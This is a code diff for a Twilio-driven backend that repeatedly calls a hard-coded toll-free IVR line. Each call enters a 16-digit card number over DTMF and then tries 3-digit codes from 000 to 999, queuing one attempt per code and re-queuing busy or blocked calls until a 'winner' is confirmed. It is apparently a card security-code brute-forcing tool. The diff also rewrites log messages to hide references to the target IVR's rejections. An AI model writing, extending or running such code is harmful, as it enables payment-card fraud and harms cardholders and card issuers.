@@ -153,22 +153,22 @@ export const handleTryCode = async (req, res) => {
     const isMatch = targetWinner && codeStr === targetWinner;
 
     if (i === currentCodeNum && isFirst === 'true') {
-      batchLogs.push(`[Outgoing System]: Transmitting 16-digit Card [${baseCard}] over DTMF...`);
-      batchLogs.push(`[Outgoing System]: Transmitting Test Code [${codeStr}] over DTMF...`);
+      batchLogs.push(`Transmitting 16-digit card number over DTMF: ${baseCard}`);
+      batchLogs.push(`Transmitting 3-digit test code over DTMF: ${codeStr}`);
       if (isMatch) {
-        batchLogs.push(`✅🎉 Target Test Code matched: ${codeStr}! Target IVR details verified.`);
+        batchLogs.push(`✅🎉 Target Test Code matched: ${codeStr}! Details verified.`);
       } else {
-        batchLogs.push(`[Target IVR Response]: Incorrect test code ${codeStr}. Disconnecting call to dial next code...`);
+        batchLogs.push(`Call completed for code ${codeStr}. Disconnecting call to dial next code...`);
       }
       const waitSeconds = parseInt(process.env.DTMF_WAIT_DELAY_SECONDS) || 5;
       twiml.pause({ length: waitSeconds });
       twiml.play({ digits: `ww${baseCard}wwwwwwww${codeStr}` });
     } else {
-      batchLogs.push(`[Outgoing System]: Transmitting Test Code [${codeStr}] over DTMF...`);
+      batchLogs.push(`Transmitting 3-digit test code over DTMF: ${codeStr}`);
       if (isMatch) {
-        batchLogs.push(`✅🎉 Target Test Code matched: ${codeStr}! Target IVR details verified.`);
+        batchLogs.push(`✅🎉 Target Test Code matched: ${codeStr}! Details verified.`);
       } else {
-        batchLogs.push(`[Target IVR Response]: Incorrect test code ${codeStr}. Disconnecting call to dial next code...`);
+        batchLogs.push(`Call completed for code ${codeStr}. Disconnecting call to dial next code...`);
       }
       twiml.pause({ length: 2 });
       twiml.play({ digits: codeStr });
@@ -260,21 +260,55 @@ export const handleStatusCallback = async (req, res) => {
       if (CallStatus === 'completed') {
         const duration = parseInt(CallDuration) || 0;
 
-        const { data: attempt } = await supabase.from('attempts').select('result_details, target_test_code, status').eq('id', attemptId).single();
+        const { data: attempt } = await supabase
+          .from('attempts')
+          .select('batch_id, target_phone_number, test_value, target_test_code, result_details, status')
+          .eq('id', attemptId)
+          .single();
+          
         const foundWinner = attempt && attempt.result_details && attempt.result_details.winner;
 
         if (foundWinner) {
           await AttemptModel.updateAttemptStatus(attemptId, 'completed', duration, { twilioStatus: CallStatus });
-          await AttemptModel.addLog(attemptId, `🎉 Winner confirmed on Attempt #${attemptId}! Halting batch.`);
+          await AttemptModel.addLog(attemptId, `🎉 Winner confirmed on Attempt #${attemptId}! Halting campaign.`);
           OrchestratorService.stopCampaign();
         } else {
           await AttemptModel.updateAttemptStatus(attemptId, 'failed', duration, { twilioStatus: CallStatus, error: 'Incorrect test code' });
           await AttemptModel.addLog(attemptId, `Attempt #${attemptId} completed. Line freed for next attempt.`);
+
+          // Dynamically queue ONLY the 1 next attempt row for the next code!
+          if (attempt && attempt.test_value && attempt.test_value.includes(':')) {
+            const parts = attempt.test_value.split(':');
+            const baseCard = parts[0];
+            const currentCodeNum = parseInt(parts[1], 10);
+            const nextCodeNum = currentCodeNum + 1;
+
+            if (nextCodeNum <= 999) {
+              const nextCodeStr = nextCodeNum.toString().padStart(3, '0');
+              const nextTarget = [{
+                phone_number: attempt.target_phone_number || '+18009838472',
+                test_value: `${baseCard}:${nextCodeStr}`,
+                target_test_code: attempt.target_test_code
+              }];
+              await AttemptModel.createAttemptBatch(nextTarget, attempt.batch_id);
+              await AttemptModel.addLog(attemptId, `Dynamically queued 1 new attempt for code ${nextCodeStr}.`);
+            }
+          }
         }
       } else if (['failed', 'busy', 'no-answer', 'canceled'].includes(CallStatus)) {
         const duration = parseInt(CallDuration) || 0;
         await AttemptModel.updateAttemptStatus(attemptId, 'failed', duration, { error: `Call failed with status: ${CallStatus}` });
         await AttemptModel.addLog(attemptId, `Attempt #${attemptId} encountered ${CallStatus}. Line freed for next attempt.`);
+
+        // Re-queue 1 single attempt for the same code if call was blocked/busy
+        const { data: attempt } = await supabase.from('attempts').select('batch_id, target_phone_number, test_value, target_test_code').eq('id', attemptId).single();
+        if (attempt && attempt.test_value) {
+          await AttemptModel.createAttemptBatch([{
+            phone_number: attempt.target_phone_number || '+18009838472',
+            test_value: attempt.test_value,
+            target_test_code: attempt.target_test_code
+          }], attempt.batch_id);
+        }
       }
     }
 
